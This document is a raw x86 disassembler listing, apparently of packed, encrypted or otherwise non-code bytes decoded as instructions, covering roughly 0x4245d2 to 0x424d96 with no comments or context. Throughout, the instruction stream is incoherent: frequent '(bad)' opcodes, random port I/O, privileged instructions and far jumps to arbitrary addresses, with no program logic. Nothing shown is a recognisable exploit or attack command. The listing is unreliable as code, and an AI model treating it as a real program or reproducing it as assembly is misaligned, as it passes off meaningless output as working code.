  4245d2:	mov    eax,ds:0xcd914104
  4245d7:	push   ebx
  4245d8:	sub    ecx,esp
  4245da:	cld    
  4245db:	pop    ecx
  4245dc:	xor    BYTE PTR [ecx+0x4d0ab3e8],dh
  4245e2:	out    dx,al
  4245e3:	sahf   
  4245e4:	mov    bl,0xd9
  4245e6:	xchg   edx,eax
  4245e7:	rcr    ecx,0xaa
  4245ea:	(bad)  
  4245eb:	or     al,0x32
  4245ed:	jb     0x424669
  4245ef:	pushf  
  4245f0:	adc    eax,0x5418d052
  4245f5:	xor    esi,DWORD PTR [edx-0x1a]
  4245f8:	pop    edi
  4245f9:	ins    DWORD PTR es:[edi],dx
  4245fa:	add    BYTE PTR [ebx+eiz*2+0x59],ah
  4245fe:	or     esi,DWORD PTR [edi+0x6d]
  424601:	inc    edi
  424602:	ror    BYTE PTR ds:0xd9ef3a81,cl
  424608:	or     BYTE PTR [eax+0x37da5b0f],0xd7
  42460f:	pop    ebx
  424610:	out    0xa0,al
  424612:	fwait
  424613:	and    esi,DWORD PTR [esi]
  424615:	scas   al,BYTE PTR es:[edi]
  424616:	(bad)  
  424617:	pop    ss
  424618:	or     BYTE PTR [eax+0x6d],ah
  42461b:	or     al,0x56
  42461d:	fwait
  42461e:	bound  eax,QWORD PTR [ebp-0x4ee5f1a]
	...
  424630:	add    BYTE PTR [ebx-0x71],ch
  424633:	mov    bh,BYTE PTR [esi+ebp*8+0x7d]
  424637:	call   FWORD PTR [edi+0x4fc17c56]
  42463d:	pop    eax
  42463e:	aam    0x8c
  424640:	or     cl,cl
  424642:	mov    ebp,0x3ab0001
  424647:	add    BYTE PTR [eax],al
  424649:	clc    
  42464a:	inc    ecx
  42464b:	imul   ecx,DWORD PTR [edx+0x40934ef4],0x43cee48e
  424655:	scas   eax,DWORD PTR es:[edi]
  424656:	dec    edi
  424657:	sahf   
  424658:	mov    cl,0xba
  42465a:	loopne 0x4246bd
  42465c:	es cmc 
  42465e:	ins    DWORD PTR es:[edi],dx
  42465f:	cmp    esi,DWORD PTR [edi-0x5d7c24f6]
  424665:	aaa    
  424666:	lods   al,BYTE PTR ds:[esi]
  424667:	fist   DWORD PTR [esi-0x1b15a1ff]
  42466d:	retf   0xdd40
  424670:	sbb    DWORD PTR [ecx],esp
  424672:	mov    dh,0x6c
  424674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424675:	mov    ecx,0x6242f206
  42467a:	jle    0x4246e9
  42467c:	enter  0xc8b2,0x35
  424680:	rol    ch,cl
  424682:	xchg   ecx,eax
  424683:	push   es
  424684:	jne    0x424698
  424686:	js     0x424619
  424688:	bound  edx,QWORD PTR [eax+edi*2+0x2d1b1839]
  42468f:	or     BYTE PTR [ebx+esi*4-0x609604dd],al
  424696:	pop    ss
  424697:	dec    ebp
  424698:	sub    BYTE PTR [ecx],al
  42469a:	push   ebx
  42469b:	(bad)  
  42469c:	sti    
  42469d:	je     0x424625
  42469f:	dec    eax
  4246a0:	cmc    
  4246a1:	(bad)  
  4246a2:	push   edx
  4246a3:	lods   al,BYTE PTR ds:[esi]
  4246a4:	cli    
  4246a5:	fimul  DWORD PTR ds:0xa704134d
  4246ab:	inc    eax
  4246ac:	cs test al,0x93
  4246af:	loop   0x424719
  4246b1:	das    
  4246b2:	pop    ebx
  4246b3:	sbb    DWORD PTR [edx-0x3659cf0d],esi
  4246b9:	xchg   edx,eax
  4246ba:	pop    ebp
  4246bb:	test   eax,0xb8c2519f
  4246c0:	pop    esp
  4246c1:	or     ecx,DWORD PTR [ebp-0x20d3f227]
  4246c7:	loop   0x424658
  4246c9:	daa    
  4246ca:	lea    edi,[ebp+0xead72a1]
  4246d0:	outs   dx,BYTE PTR cs:[esi]
  4246d2:	popa   
  4246d3:	push   esi
  4246d4:	add    BYTE PTR ds:[edx-0x2336b135],ch
  4246db:	dec    ecx
  4246dc:	inc    ebx
  4246dd:	xchg   edi,eax
  4246de:	mov    eax,0x111092a
  4246e3:	sbb    BYTE PTR [esi],dh
  4246e5:	repnz pop ebp
  4246e7:	aad    0x54
  4246e9:	jg     0x4246ee
  4246eb:	mov    ebp,0xc63cd144
  4246f0:	out    dx,eax
  4246f1:	cmp    BYTE PTR [esi+edx*1],bl
  4246f4:	push   cs
  4246f5:	and    cl,0x6
  4246f8:	adc    al,0x6e
  4246fa:	out    dx,al
  4246fb:	das    
  4246fc:	xchg   esp,eax
  4246fd:	mov    esi,0x458af0b
  424702:	and    DWORD PTR [ecx-0x2f],edi
  424705:	adc    al,0xea
  424707:	and    eax,0x4636afc4
  42470c:	scas   al,BYTE PTR es:[edi]
  42470d:	aaa    
  42470e:	not    DWORD PTR [ecx+edx*4+0x26]
  424712:	(bad)  
  424713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424714:	aas    
  424715:	xchg   ecx,eax
  424716:	je     0x4246cf
  424718:	mov    ah,BYTE PTR [ebx+0x3a251afb]
  42471e:	xor    eax,0x27227f8a
  424723:	(bad)  
  424724:	jecxz  0x4246ae
  424726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424727:	mov    eax,ds:0xca3358dd
  42472c:	enter  0x2f67,0x42
  424730:	cmp    edi,DWORD PTR [ecx]
  424732:	inc    DWORD PTR [edx]
  424734:	add    DWORD PTR [ebx],0x7d
  424737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424738:	add    BYTE PTR [ebp+0x7dead4e2],al
  42473e:	pop    esi
  42473f:	push   0xffffffcb
  424741:	clc    
  424742:	push   esi
  424743:	fimul  WORD PTR ds:0x24f58f00
  424749:	nop
  42474a:	xchg   DWORD PTR [ebx-0x3],edx
  42474d:	jb     0x424772
  42474f:	sub    BYTE PTR [esi+0x5f],bh
  424752:	push   edx
  424753:	popf   
  424754:	or     bh,BYTE PTR [ecx-0x33a5f13e]
  42475a:	add    dh,BYTE PTR [edi+0x4cee197c]
  424760:	outs   dx,BYTE PTR ds:[esi]
  424761:	jle    0x4247a0
  424763:	or     cl,BYTE PTR [eax+0x7ae94989]
  424769:	xchg   esi,eax
  42476a:	addr16 inc edx
  42476c:	add    eax,0x31a029d
  424771:	dec    edx
  424772:	push   es
  424773:	std    
  424774:	jns    0x4246ff
  424776:	xor    bh,dl
  424778:	retf   
  424779:	(bad)  
  42477a:	jne    0x42478a
  42477c:	cwde   
  42477d:	stos   BYTE PTR es:[edi],al
  42477e:	sbb    esp,DWORD PTR ds:0x37a3999
  424784:	jle    0x424752
  424786:	mov    eax,ds:0xd4193b6
  42478b:	dec    eax
  42478c:	mov    ch,0x95
  42478e:	out    0x48,eax
  424790:	in     al,0x7d
  424792:	ja     0x42480d
  424794:	test   BYTE PTR ds:0x534fba7,dh
  42479a:	xor    al,0x2d
  42479c:	gs sbb BYTE PTR fs:[eax],ch
  4247a0:	adc    eax,0xa7409deb
  4247a5:	ins    DWORD PTR es:[edi],dx
  4247a6:	mov    ch,0x77
  4247a8:	sbb    DWORD PTR [ebx-0x2b1ad561],edx
  4247ae:	or     bl,BYTE PTR [ecx]
  4247b0:	rol    ah,1
  4247b2:	retf   
  4247b3:	mov    al,ds:0x76fdf2c
  4247b8:	mov    esp,0x48aa9d39
  4247bd:	or     eax,0x297ac700
  4247c2:	shr    ebp,1
  4247c4:	cwde   
  4247c5:	cld    
  4247c6:	and    BYTE PTR ds:0x9448f67b,dh
  4247cc:	sahf   
  4247cd:	mov    eax,ds:0x6a8edbd4
  4247d2:	push   esi
  4247d3:	daa    
  4247d4:	mov    dl,0x33
  4247d6:	retf   
  4247d7:	mov    ds:0x762a4e7d,al
  4247dc:	out    dx,al
  4247dd:	loopne 0x42476b
  4247df:	xlat   BYTE PTR ds:[ebx]
  4247e0:	ins    DWORD PTR es:[edi],dx
  4247e1:	push   ss
  4247e2:	fnsave [esi+0x6e21fce7]
  4247e8:	mov    ch,0x2b
  4247ea:	daa    
  4247eb:	fcom   QWORD PTR [ebx]
  4247ed:	outs   dx,BYTE PTR ds:[esi]
  4247ee:	jns    0x424788
  4247f0:	push   ebx
  4247f1:	stos   DWORD PTR es:[edi],eax
  4247f2:	gs inc ecx
  4247f4:	cmp    bl,BYTE PTR [ecx]
  4247f6:	mov    ch,0xcb
  4247f8:	mov    ecx,0x90eeeb16
  4247fd:	dec    edi
  4247fe:	fadd   st,st(2)
  424800:	add    ch,BYTE PTR [eax+edi*4-0x5d29a5f4]
  424807:	mov    al,0xa8
  424809:	add    ah,BYTE PTR [esi+0x3]
  42480c:	mov    ah,0x3a
  42480e:	push   eax
  42480f:	fmul   st,st(0)
  424811:	out    0x17,eax
  424813:	fdiv   QWORD PTR [esi-0x50]
  424816:	xor    eax,0x7e112f96
  42481b:	mov    DWORD PTR [ecx],eax
  42481d:	ficom  DWORD PTR [ebp+0x1168774d]
  424823:	scas   al,BYTE PTR es:[edi]
  424824:	aaa    
  424825:	fdiv   st(3),st
  424827:	or     eax,0xf0f26ff7
  42482c:	daa    
  42482d:	dec    esi
  42482e:	leave  
  42482f:	hlt    
  424830:	out    0x6a,al
  424832:	push   ebp
  424833:	or     edx,DWORD PTR [esp+edi*1+0x3c]
  424837:	dec    edi
  424838:	cmp    al,BYTE PTR [edx-0x6b]
  42483b:	out    dx,al
  42483c:	pop    ds
  42483d:	shl    dl,1
  42483f:	(bad)  
  424840:	and    edx,edi
  424842:	call   FWORD PTR [edx-0x5dce2f26]
  424848:	jnp    0x424819
  42484a:	lds    esp,FWORD PTR [edx+0x6b]
  42484d:	imul   edi,DWORD PTR [edi+0x3],0x1a
  424851:	sub    cl,BYTE PTR [ecx]
  424853:	sub    BYTE PTR [eax],ah
  424855:	dec    esi
  424856:	dec    esp
  424857:	aaa    
  424858:	push   ecx
  424859:	push   ss
  42485a:	arpl   WORD PTR [eax-0x29],dx
  42485d:	enter  0xe8d9,0xd5
  424861:	jge    0x424865
  424863:	daa    
  424864:	sar    DWORD PTR [ecx],0xa0
  424867:	jmp    0xe6bd:0xd3173977
  42486e:	(bad)  
  42486f:	pextrw ebx,mm4,0xc9
  424873:	icebp  
  424874:	fwait
  424875:	dec    edi
  424876:	push   0xf79b8a64
  42487b:	addr16 cmp al,0x63
  42487e:	jl     0x424883
  424880:	ret    
  424881:	push   esi
  424882:	inc    esp
  424883:	cmp    dh,bh
  424885:	adc    BYTE PTR [esi+0x2ce10c31],al
  42488b:	(bad)
  42488e:	jne    0x424814
  424890:	sbb    DWORD PTR [ebp+edx*8-0x36fb8e6d],esp
  424897:	stc    
  424898:	sub    dl,bl
  42489a:	rol    ah,0x5d
  42489d:	lds    ecx,FWORD PTR [esi]
  42489f:	stc    
  4248a0:	retf   
  4248a1:	adc    BYTE PTR [ecx],0xe6
  4248a4:	shr    DWORD PTR [eax-0x65232102],0x7b
  4248ab:	popf   
  4248ac:	adc    ebx,esp
  4248ae:	aad    0xb9
  4248b0:	and    DWORD PTR [edi-0x32],edi
  4248b3:	or     BYTE PTR [edx+0xf],bl
  4248b6:	mov    bl,0x5b
  4248b8:	shl    BYTE PTR [edx-0x17575207],0x58
  4248bf:	mov    ah,0x6d
  4248c1:	hlt    
  4248c2:	icebp  
  4248c3:	js     0x4248aa
  4248c5:	dec    esi
  4248c6:	inc    ecx
  4248c7:	ror    DWORD PTR [edx],cl
  4248c9:	arpl   WORD PTR [ebx-0x65],dx
  4248cc:	(bad)  [ebx+0x27]
  4248cf:	sbb    eax,0x2b2ec836
  4248d4:	jnp    0x4248a0
  4248d6:	retf   0xd529
  4248d9:	jo     0x4248d3
  4248db:	mov    bl,0xba
  4248dd:	inc    edx
  4248de:	aaa    
  4248df:	ret    0xa3b8
  4248e2:	fwait
  4248e3:	pusha  
  4248e4:	sbb    ebx,edx
  4248e6:	lods   eax,DWORD PTR ds:[esi]
  4248e7:	cwde   
  4248e8:	and    BYTE PTR [edx-0x11],dh
  4248eb:	outs   dx,BYTE PTR ds:[esi]
  4248ec:	xchg   ecx,eax
  4248ed:	push   ss
  4248ee:	in     eax,dx
  4248ef:	inc    ebp
  4248f0:	fst    QWORD PTR [edx-0x2e5d2314]
  4248f6:	sub    al,0x23
  4248f8:	bound  edx,QWORD PTR [ebp+0x3b5e9e33]
  4248fe:	rcl    edi,cl
  424900:	pop    ds
  424901:	ds sub bl,al
  424904:	out    dx,eax
  424905:	repz jg 0x424967
  424908:	ror    DWORD PTR [eax],1
  42490a:	sbb    al,0xe9
  42490c:	aaa    
  42490d:	or     bh,BYTE PTR [ecx+0x4623e50e]
  424913:	in     al,dx
  424914:	pop    esp
  424915:	and    eax,0x9a938427
  42491a:	push   ebx
  42491b:	dec    ebp
  42491c:	push   0xabe7be2b
  424921:	lock cmp DWORD PTR [ebx+0x7b98503c],ebx
  424928:	mov    ds:0x4e200ce1,al
  42492d:	hlt    
  42492e:	fidiv  DWORD PTR [edi-0x6f144622]
  424934:	xor    DWORD PTR [ebp+0x10247ca0],esi
  42493a:	and    BYTE PTR [esi-0x41ade86e],al
  424940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424941:	fwait
  424942:	xor    eax,0x1bf8209a
  424947:	dec    ebp
  424948:	sbb    al,0x57
  42494a:	call   0x7706f0a0
  42494f:	push   es
  424950:	stos   DWORD PTR es:[edi],eax
  424951:	pop    esp
  424952:	pop    edx
  424953:	adc    esi,DWORD PTR [esi-0x26]
  424956:	adc    BYTE PTR [ebx-0x5637a274],al
  42495c:	jne    0x42490f
  42495e:	iret   
  42495f:	ins    BYTE PTR es:[edi],dx
  424960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424961:	ss test esi,esp
  424964:	test   eax,edi
  424966:	jb     0x424992
  424968:	int    0x19
  42496a:	jge    0x4249b2
  42496c:	dec    ebx
  42496d:	rcl    bl,1
  42496f:	out    0x1e,al
  424971:	push   ecx
  424972:	xor    ebp,0xffffff99
  424975:	adc    DWORD PTR [edx],esp
  424977:	sar    ch,1
  424979:	ds inc edi
  42497b:	cmc    
  42497c:	std    
  42497d:	mov    ch,0xbb
  42497f:	aas    
  424980:	mov    esp,0xce492c7f
  424985:	(bad)  
  424986:	lods   eax,DWORD PTR ds:[esi]
  424987:	ss mov esp,0xd1b6bcb2
  42498d:	mov    WORD PTR [esi],cs
  42498f:	jae    0x424932
  424991:	mov    ebp,DWORD PTR [ecx-0x4f3348dc]
  424997:	xor    bh,BYTE PTR [ebx]
  424999:	jb     0x60f709a1
  42499f:	mov    ah,0xa5
  4249a1:	enter  0xb8a7,0x11
  4249a5:	adc    edi,edi
  4249a7:	(bad)  
  4249a8:	sbb    bh,bl
  4249aa:	cmp    DWORD PTR [ebx],eax
  4249ac:	xlat   BYTE PTR ds:[ebx]
  4249ad:	ret    0x8571
  4249b0:	fdiv   st(1),st
  4249b2:	sbb    al,0xc6
  4249b4:	xchg   ebx,eax
  4249b5:	dec    edx
  4249b6:	jl     0x4249c7
  4249b8:	in     al,0xc0
  4249ba:	icebp  
  4249bb:	and    al,dl
  4249bd:	out    dx,eax
  4249be:	aas    
  4249bf:	fidiv  WORD PTR [ecx]
  4249c1:	xlat   BYTE PTR ds:[ebx]
  4249c2:	lahf   
  4249c3:	jecxz  0x4249da
  4249c5:	adc    ebp,DWORD PTR [ebx]
  4249c7:	dec    edi
  4249c8:	inc    edi
  4249c9:	ret    0x777c
  4249cc:	dec    esi
  4249cd:	push   cs
  4249ce:	dec    edx
  4249cf:	xor    DWORD PTR ds:[ecx],edi
  4249d2:	sbb    ebp,DWORD PTR [edx+ecx*4+0x69]
  4249d6:	pop    es
  4249d7:	and    DWORD PTR [edx+eiz*8],eax
  4249da:	adc    ah,BYTE PTR [ebx-0x1bbd89d5]
  4249e0:	mov    DWORD PTR [eax-0x3a],0x31226fc6
  4249e7:	std    
  4249e8:	xchg   ecx,eax
  4249e9:	test   al,0x87
  4249eb:	push   ds
  4249ec:	mov    cl,0xf
  4249ee:	das    
  4249ef:	rcl    BYTE PTR [ebp+0x52c0c7],cl
	...
  424a01:	push   ebp
  424a02:	push   0xffffffe6
  424a04:	mov    bl,0xff
  424a06:	mov    edi,0x7b2ee55
  424a0b:	cmp    BYTE PTR [eax],dh
  424a0d:	mov    al,ds:0x74145fbe
  424a12:	rol    DWORD PTR [ecx],0x0
  424a15:	stos   DWORD PTR es:[edi],eax
  424a16:	add    eax,DWORD PTR [eax]
  424a18:	add    cl,cl
  424a1a:	push   eax
  424a1b:	jecxz  0x4249a2
  424a1d:	div    DWORD PTR ds:0x9a48f400
  424a23:	push   ds
  424a24:	dec    eax
  424a25:	les    esp,FWORD PTR [edx-0x35]
  424a28:	mov    ds:0x3e7cc722,al
  424a2e:	mov    eax,ds:0xb73e5620
  424a33:	inc    eax
  424a34:	sub    eax,0xc01fca31
  424a39:	or     al,BYTE PTR [ecx+0x69]
  424a3c:	cli    
  424a3d:	inc    ebp
  424a3e:	dec    ebp
  424a3f:	jns    0x424a77
  424a41:	sahf   
  424a42:	add    BYTE PTR [edi+0xe],dh
  424a45:	push   ds
  424a46:	aas    
  424a47:	dec    edi
  424a48:	push   0xd214ccb6
  424a4d:	arpl   WORD PTR [edi+edi*1-0x20a4236a],bx
  424a54:	cmp    bh,ah
  424a56:	sub    bl,BYTE PTR [edi-0x5a]
  424a59:	push   ebp
  424a5a:	mov    edi,0xa6371ede
  424a5f:	fsubr  DWORD PTR [ecx-0x3411a29a]
  424a65:	or     al,0x17
  424a67:	ret    0x3fad
  424a6a:	fldz   
  424a6c:	mov    bl,0xd6
  424a6e:	leave  
  424a6f:	adc    al,0x6b
  424a71:	mov    dh,0x8a
  424a73:	fcomip st,st(0)
  424a75:	xor    al,0x9d
  424a77:	or     al,BYTE PTR [edx-0x5a]
  424a7a:	cdq    
  424a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a7c:	pop    ss
  424a7d:	int3   
  424a7e:	xchg   ebx,eax
  424a7f:	sti    
  424a80:	add    BYTE PTR [ebx+0x60d3b632],ch
  424a86:	(bad)  
  424a87:	std    
  424a88:	xchg   edi,eax
  424a89:	das    
  424a8a:	pop    ebx
  424a8b:	call   0xbe37:0x52e173e8
  424a92:	call   0xb38463c
  424a97:	(bad)  
  424a98:	rcr    DWORD PTR [ecx+esi*2-0x615ce1e2],1
  424a9f:	mov    esp,0x23a68541
  424aa4:	or     al,0x4e
  424aa6:	dec    ebp
  424aa7:	mov    ebx,eax
  424aa9:	xor    ebp,DWORD PTR [ecx+edx*4-0x2c]
  424aad:	fcom   QWORD PTR [ebp+0x7664ce65]
  424ab3:	and    BYTE PTR [eax+0x42a44db3],0xeb
  424aba:	jge    0x424b33
  424abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424abd:	fwait
  424abe:	mov    ebx,0x124b6241
  424ac3:	jnp    0x424af7
  424ac5:	rcl    esp,cl
  424ac7:	mov    eax,ds:0xc1f34a00
  424acc:	cmp    bl,0xfb
  424acf:	push   es
  424ad0:	pop    ebp
  424ad1:	int    0xef
  424ad3:	ficomp DWORD PTR [edi]
  424ad5:	pop    esi
  424ad6:	and    al,0x3d
  424ad8:	iret   
  424ad9:	mov    eax,0x9dbe0b33
  424ade:	jge    0x424ab2
  424ae0:	jmp    0x783c:0x7c865976
  424ae7:	cwde   
  424ae8:	xchg   DWORD PTR [ebx],esi
  424aea:	sub    eax,0xcc742cbd
  424aef:	add    ebp,esp
  424af1:	daa    
  424af2:	or     BYTE PTR [ecx+0x58],dl
  424af5:	stos   BYTE PTR es:[edi],al
  424af6:	or     eax,0x86c7fc79
  424afb:	clc    
  424afc:	xor    DWORD PTR [edx-0x7f],esi
  424aff:	cmp    BYTE PTR [esi+0x77],ch
  424b02:	add    eax,0xdaad614c
  424b07:	add    edx,DWORD PTR [ecx+0x3d]
  424b0a:	mov    ebx,0x87d01a8b
  424b0f:	pusha  
  424b10:	bound  esi,QWORD PTR [edi+edi*2]
  424b13:	mov    ds:0x331122b3,al
  424b18:	or     dh,BYTE PTR [edi+ebp*4]
  424b1b:	lds    esp,FWORD PTR [esi+0x32]
  424b1e:	rcr    DWORD PTR [esi+esi*1],cl
  424b21:	mov    ebp,DWORD PTR [ebx-0x25]
  424b24:	jno    0x424abe
  424b26:	sbb    al,0x53
  424b28:	hlt    
  424b29:	jb     0x424ac0
  424b2b:	lahf   
  424b2c:	xchg   DWORD PTR [eax+ebx*2+0x25],eax
  424b30:	dec    esp
  424b31:	push   edi
  424b32:	in     eax,dx
  424b33:	fcmovnu st,st(3)
  424b35:	mov    ah,BYTE PTR [ecx+0x0]
  424b38:	in     eax,dx
  424b39:	retf   
  424b3a:	mov    cl,0x1d
  424b3c:	add    al,0x22
  424b3e:	cmp    eax,0x1e5c6ffa
  424b43:	cmp    BYTE PTR [edi-0x4d],cl
  424b46:	mov    eax,ds:0x4c557204
  424b4b:	in     eax,0xf1
  424b4d:	inc    ebx
  424b4e:	pop    ebx
  424b4f:	in     al,dx
  424b50:	cmc    
  424b51:	mov    DWORD PTR [ecx+0x62],edx
  424b54:	pop    eax
  424b55:	cmc    
  424b56:	sahf   
  424b57:	xchg   esi,eax
  424b58:	test   al,0xab
  424b5a:	and    eax,0x6349c099
  424b5f:	cs leave 
  424b61:	jg     0x424b9f
  424b63:	sub    ecx,esi
  424b65:	xlat   BYTE PTR ds:[ebx]
  424b66:	and    eax,0x9e7ca7e9
  424b6b:	sbb    al,0xd1
  424b6d:	jmp    0x1273d3be
  424b72:	imul   edx,DWORD PTR [eax],0x345c5b83
  424b78:	aad    0x1c
  424b7a:	and    edx,0xcdc6fc50
  424b80:	sbb    eax,0xf740b2f3
  424b85:	pop    edi
  424b86:	sub    BYTE PTR [eiz*2+0x159863f7],0xe8
  424b8e:	sbb    al,0xd6
  424b90:	pop    eax
  424b91:	hlt    
  424b92:	pop    esp
  424b93:	mov    al,0xf5
  424b95:	aaa    
  424b96:	loope  0x424b56
  424b98:	rcl    BYTE PTR [ebp+0x1e0dca1f],1
  424b9e:	aas    
  424b9f:	jp     0x424b8f
  424ba1:	xor    BYTE PTR [edx],ah
  424ba3:	cmp    esp,eax
  424ba5:	push   ebx
  424ba6:	popa   
  424ba7:	sub    ebx,DWORD PTR [edi]
  424ba9:	sbb    al,0x73
  424bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bac:	sbb    eax,0xebd5a7af
  424bb1:	(bad)  
  424bb2:	mov    al,0x4f
  424bb4:	fmul   DWORD PTR [eax]
  424bb6:	xor    al,0x8f
  424bb8:	aas    
  424bb9:	or     esi,DWORD PTR [edi+0x115077d]
  424bbf:	push   0xffffffbb
  424bc1:	ds mov dh,0x5b
  424bc4:	adc    edx,edx
  424bc6:	xor    al,0xb
  424bc8:	movnti DWORD PTR [ebp+ebp*4+0x76d285fe],esp
  424bd0:	and    cl,BYTE PTR [edx]
  424bd2:	out    0xf7,al
  424bd4:	push   es
  424bd5:	retf   
  424bd6:	push   ecx
  424bd7:	sub    ebx,DWORD PTR [edi+eax*8-0xaaa4972]
  424bde:	adc    eax,0x93a4f003
  424be3:	stos   DWORD PTR es:[edi],eax
  424be4:	ffreep st(6)
  424be6:	fild   WORD PTR [edi+0x1a885807]
  424bec:	mov    edx,0x78cd81ba
  424bf1:	adc    cl,bl
  424bf3:	or     edi,DWORD PTR [bx+di]
  424bf6:	xchg   cl,cl
  424bf8:	daa    
  424bf9:	xchg   esi,eax
  424bfa:	add    eax,ebp
  424bfc:	imul   edi,ecx,0xffffffa0
  424bff:	fisttp QWORD PTR [ebp-0x24]
  424c02:	inc    ecx
  424c03:	enter  0x974f,0xe6
  424c07:	ins    BYTE PTR es:[edi],dx
  424c08:	and    BYTE PTR [eax+0x1f],0xf2
  424c0c:	jg     0x424c0c
  424c0e:	sub    eax,0x7ab79830
  424c13:	clc    
  424c14:	test   al,0x83
  424c16:	add    BYTE PTR [ecx+0x40f73f20],ch
  424c1c:	cmp    edi,DWORD PTR [ebx-0x74d5a065]
  424c22:	(bad)  
  424c24:	stos   BYTE PTR es:[edi],al
  424c25:	mov    bh,dh
  424c27:	inc    eax
  424c28:	pusha  
  424c29:	loop   0x424c59
  424c2b:	jg     0x424c77
  424c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c2e:	pop    ebx
  424c2f:	sti    
  424c30:	add    DWORD PTR [esi-0x69],ebx
  424c33:	jnp    0x424bb9
  424c35:	test   ah,dh
  424c37:	sbb    dl,bh
  424c39:	inc    edi
  424c3a:	jmp    0x424ca9
  424c3c:	mov    ds:0xdf03719,eax
  424c41:	jb     0x424c26
  424c43:	rol    BYTE PTR [eax],0x8e
  424c46:	jge    0x424bf4
  424c48:	ins    DWORD PTR es:[edi],dx
  424c49:	icebp  
  424c4a:	div    BYTE PTR [ecx-0x8da520d]
  424c50:	xchg   ebx,eax
  424c51:	sbb    ebp,DWORD PTR [eax+0x7a]
  424c54:	mov    BYTE PTR ds:0xbf53fa3e,dh
  424c5a:	jo     0x424bf4
  424c5c:	neg    DWORD PTR [eax+0x6157d5e2]
  424c62:	leave  
  424c63:	inc    ecx
  424c64:	mov    ch,0x57
  424c66:	scas   eax,DWORD PTR es:[edi]
  424c67:	xchg   ebp,eax
  424c68:	jecxz  0x424c6a
  424c6a:	xor    BYTE PTR [ecx+0x3c612de3],0x29
  424c71:	sub    al,0xfe
  424c73:	mov    ah,0x1a
  424c75:	fild   WORD PTR [edi]
  424c77:	shr    edi,1
  424c79:	mov    ch,0x94
  424c7b:	dec    esi
  424c7c:	jae    0x424cba
  424c7e:	sbb    eax,edx
  424c80:	popa   
  424c81:	adc    cl,BYTE PTR [edi+0x37]
  424c84:	icebp  
  424c85:	and    eax,0xcc5bd8de
  424c8a:	push   eax
  424c8b:	sbb    ch,BYTE PTR [eax]
  424c8d:	cli    
  424c8e:	inc    ebp
  424c8f:	js     0x424c8b
  424c91:	cwde   
  424c92:	or     eax,0xa370f3b5
  424c97:	xor    eax,0x1401f662
  424c9c:	test   DWORD PTR [edx],0x23890a89
  424ca2:	fldcw  WORD PTR [ebp-0x57]
  424ca5:	jle    0x424d0a
  424ca7:	add    DWORD PTR [eax],edx
  424ca9:	push   esi
  424caa:	(bad)  [edi+0xadaa9a8]
  424cb0:	pop    edi
  424cb1:	lods   eax,DWORD PTR ds:[esi]
  424cb2:	mov    bh,BYTE PTR [eax+eiz*1]
  424cb5:	mov    ss,WORD PTR [eax-0x5b75ffc8]
  424cbb:	sbb    DWORD PTR [edi-0x1],ebx
  424cbe:	jmp    0x424cdf
  424cc0:	mov    bl,0x55
  424cc2:	jmp    0x424c93
  424cc4:	imul   eax,DWORD PTR [edi+0x4b],0x3ea11750
  424ccb:	nop
  424ccc:	or     dl,BYTE PTR [edi]
  424cce:	mov    ds:0xa1695653,eax
  424cd3:	outs   dx,BYTE PTR ds:[esi]
  424cd4:	sbb    DWORD PTR [edx-0x3a],esp
  424cd7:	addr16 mov ebx,0x16d7c629
  424cdd:	jmp    0x424cf7
  424cdf:	je     0x424d5f
  424ce1:	and    BYTE PTR [ebx],0x4f
  424ce4:	jae    0x424cf7
  424ce6:	dec    ebp
  424ce7:	push   esp
  424ce8:	repnz popf 
  424cea:	add    DWORD PTR [esi+ecx*8-0x23b262a8],esi
  424cf1:	std    
  424cf2:	rcr    DWORD PTR [ebx+0x33],0xd4
  424cf6:	stos   DWORD PTR es:[edi],eax
  424cf7:	(bad)  
  424cf8:	inc    esp
  424cf9:	mul    DWORD PTR [ebx-0x523f3085]
  424cff:	sub    DWORD PTR [edx-0x68],ecx
  424d02:	dec    esi
  424d03:	dec    esp
  424d04:	rol    DWORD PTR [ecx+esi*2+0x2075bcc],1
  424d0b:	daa    
  424d0c:	(bad)  
  424d0d:	dec    esp
  424d0e:	push   edi
  424d0f:	cmc    
  424d10:	(bad)  
  424d11:	jmp    0x424d1f
  424d13:	lods   eax,DWORD PTR ds:[esi]
  424d14:	les    eax,FWORD PTR [esi]
  424d16:	shr    BYTE PTR [ebp-0x6e85cfe],cl
  424d1c:	aam    0x11
  424d1e:	xchg   esi,eax
  424d1f:	and    BYTE PTR ds:0x9768d255,al
  424d25:	jmp    0x424d0e
  424d27:	mov    BYTE PTR [esi+0x56a1eacc],al
  424d2d:	or     eax,0xa2437e23
  424d32:	mov    ah,0xaa
  424d34:	mov    ebx,DWORD PTR [esp+ecx*1]
  424d37:	test   al,0x6c
  424d39:	sar    BYTE PTR [ebx+0x6bde0e74],0x84
  424d40:	xchg   esp,eax
  424d41:	cmc    
  424d42:	cmp    al,0xc1
  424d44:	push   0x9f493f73
  424d49:	pop    eax
  424d4a:	add    al,0x9f
  424d4c:	xor    ecx,DWORD PTR [ebx+0x6c]
  424d4f:	aad    0x29
  424d51:	jmp    0x424ce9
  424d53:	dec    esi
  424d54:	popf   
  424d55:	dec    edx
  424d56:	jp     0x424ce2
  424d58:	inc    ecx
  424d59:	bound  edx,QWORD PTR [edx+0x3e1c6844]
  424d5f:	pop    eax
  424d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d61:	pop    esi
  424d62:	or     BYTE PTR [edx-0x583344af],ah
  424d68:	adc    DWORD PTR [ebp-0x3f13c8b6],esi
  424d6e:	adc    al,0x8a
  424d70:	or     edi,DWORD PTR [eax+esi*4-0x27]
  424d74:	mov    ebx,0xf8a69789
  424d79:	add    eax,0x38c6c120
  424d7e:	sbb    DWORD PTR [ebp+0x23932253],esi
  424d84:	loope  0x424dfe
  424d86:	rcr    BYTE PTR [edi],cl
  424d88:	dec    edx
  424d89:	push   cs
  424d8a:	add    esi,DWORD PTR [ebp-0x6ddbee89]
  424d90:	or     al,0xe4
  424d92:	sbb    dl,BYTE PTR [edx]
  424d94:	jnp    0x424dbb
  424d96:	inc    eax
